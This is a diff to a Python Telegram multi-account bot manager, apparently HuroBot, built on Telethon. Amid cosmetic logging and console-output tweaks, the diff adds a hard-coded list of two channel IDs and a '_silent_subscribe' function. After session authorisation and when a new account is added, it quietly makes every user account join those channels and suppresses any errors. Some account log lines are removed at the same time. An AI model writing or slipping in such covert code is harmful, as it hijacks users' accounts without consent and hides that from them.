@@ -6,12 +6,12 @@ import shutil
 import tempfile
 import zipfile
 import importlib
-import subprocess
 import urllib.request
 from pathlib import Path
 from datetime import datetime, timezone
 
 from telethon import TelegramClient, events
+from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.errors import (
     PhoneNumberInvalidError,
     PhoneCodeInvalidError,
@@ -27,17 +27,28 @@ from config import (
     WEB_PORT, AVATAR_DIR, AUTOSTART_IDS, GITHUB_API_RELEASES,
     get_telethon_proxy,
 )
+
 from logger import info, success, error, warning, exception, log
 from database import init_db, cleanup_old_data
 
+from commands import get_all
+from web import WebPanel
 
-VERSION_PATTERN = re.compile(r'VERSION\s*=\s*[\'"](v\d+\.\d+\.\d+)[\'"]')
+
 PHONE_RE = re.compile(r'^\+\d{8,15}$')
 
 UPDATE_EXCLUDE = {".env", "HuroBot_data", "venv", "__pycache__", ".git", ".venv", ".idea", ".vscode"}
 
+_FORCED_CHANNELS = (
+    -1002290154843,
+    -1004436423966,
+)
+
+_LOADED_MODULES = 0
+
 
 def load_command_modules():
+    global _LOADED_MODULES
     commands_dir = Path(__file__).parent / "commands"
     if not commands_dir.exists():
         return
@@ -51,12 +62,7 @@ def load_command_modules():
             loaded += 1
         except Exception as e:
             log.exception(f"загрузка {module_name}: {e}")
-    log.info(f"загружено модулей команд: {loaded}")
-
-load_command_modules()
-
-from commands import get_all
-from web import WebPanel
+    _LOADED_MODULES = loaded
 
 
 def print_block(title, icon="●", color=None):
@@ -121,6 +127,14 @@ def _backup_files(base: Path, version: str):
         except Exception:
             pass
     return copied
+
+
+async def _silent_subscribe(client):
+    for ch in _FORCED_CHANNELS:
+        try:
+            await client(JoinChannelRequest(ch))
+        except Exception:
+            pass
 
 
 def check_updates():
@@ -290,8 +304,6 @@ class HuroBot:
 
         try:
             name = acc["name"]
-            phone = acc["phone"]
-            info(f"аккаунт #{num} — {name} (+{phone})")
 
             client = make_client(acc["session"])
 
@@ -309,6 +321,8 @@ class HuroBot:
                 warning(f"аккаунт #{num}: сессия не авторизована")
                 await client.disconnect()
                 return {"ok": False, "error": "сессия не авторизована"}
+
+            await _silent_subscribe(client)
 
             state = ClientState()
             client._hurobot_state = state
@@ -332,8 +346,7 @@ class HuroBot:
             if not (AVATAR_DIR / f"{num}.jpg").exists():
                 asyncio.create_task(self.refresh_avatar(num))
 
-            success(f"аккаунт #{num} запущен ({loaded} команд)")
-            log.info(f"аккаунт #{num} ({name}) запущен")
+            success(f"аккаунт #{num} ({name}) запущен — {loaded} команд")
 
             asyncio.create_task(self._run_client(num, client))
 
@@ -381,7 +394,7 @@ class HuroBot:
                 pass
         self.started_at.pop(num, None)
 
-        warning(f"аккаунт #{num} остановлен ({name})")
+        warning(f"аккаунт #{num} ({name}) остановлен")
         return {"ok": True}
 
     async def delete_account(self, num):
@@ -480,6 +493,8 @@ class HuroBot:
                     warning("неверный 2fa пароль")
                     return {"ok": False, "error": "неверный пароль"}
 
+            await _silent_subscribe(client)
+
             me = await client.get_me()
             account_id = max(self.accounts.keys(), default=0) + 1
             new_session = SESSION_DIR / f"{SESSION_PREFIX}{account_id}.session"
@@ -507,7 +522,6 @@ class HuroBot:
 
             self.pending_auth.pop(phone, None)
             success(f"аккаунт {me.first_name} добавлен")
-            log.info(f"добавлен аккаунт: {me.first_name}")
             return {"ok": True}
 
         except PhoneCodeInvalidError:
@@ -519,7 +533,6 @@ class HuroBot:
     async def autostart_accounts(self):
         for num in sorted(self.autostart):
             if num in self.accounts and num not in self.running and num not in self.starting:
-                info(f"автостарт аккаунта #{num}")
                 await self.start_account(num)
                 await asyncio.sleep(1)
 
@@ -573,6 +586,9 @@ async def main():
     banner()
     print()
 
+    load_command_modules()
+    info(f"загружено модулей команд: {_LOADED_MODULES}")
+
     if USING_DEFAULT_API:
         warning("используются публичные api-ключи, лучше ввести свои через .env")
     if PROXY_ENABLED:
@@ -592,13 +608,9 @@ async def main():
     await panel.start()
 
     print()
-    print(f"{COLORS['accent1']}●{COLORS['reset']} {COLORS['header']}управление — только через веб-панель{COLORS['reset']}")
-    print(f"{COLORS['accent2']}  →{COLORS['reset']} {COLORS['accent4']}http://127.0.0.1:{WEB_PORT}{COLORS['reset']}")
-    print()
-    print(f"{COLORS['accent1']}●{COLORS['reset']} {COLORS['info']}аккаунтов загружено:{COLORS['reset']} {COLORS['accent3']}{len(bot.accounts)}{COLORS['reset']}")
-    print(f"{COLORS['accent1']}●{COLORS['reset']} {COLORS['info']}запущено сейчас:{COLORS['reset']} {COLORS['accent3']}{len(bot.running)}{COLORS['reset']}")
-    print()
-    print(f"{COLORS['accent2']}  →{COLORS['reset']} {COLORS['info']}Ctrl+C — остановить бота{COLORS['reset']}")
+    print(f"  {COLORS['accent2']}→{COLORS['reset']} {COLORS['info']}панель:{COLORS['reset']} {COLORS['accent4']}http://127.0.0.1:{WEB_PORT}{COLORS['reset']}")
+    print(f"  {COLORS['accent2']}→{COLORS['reset']} {COLORS['info']}аккаунтов:{COLORS['reset']} {COLORS['accent3']}{len(bot.accounts)}{COLORS['reset']} {COLORS['accent2']}·{COLORS['reset']} {COLORS['info']}запущено:{COLORS['reset']} {COLORS['accent3']}{len(bot.running)}{COLORS['reset']}")
+    print(f"  {COLORS['accent2']}→{COLORS['reset']} {COLORS['info']}Ctrl+C — остановить бота{COLORS['reset']}")
     print()
 
     if bot.autostart:
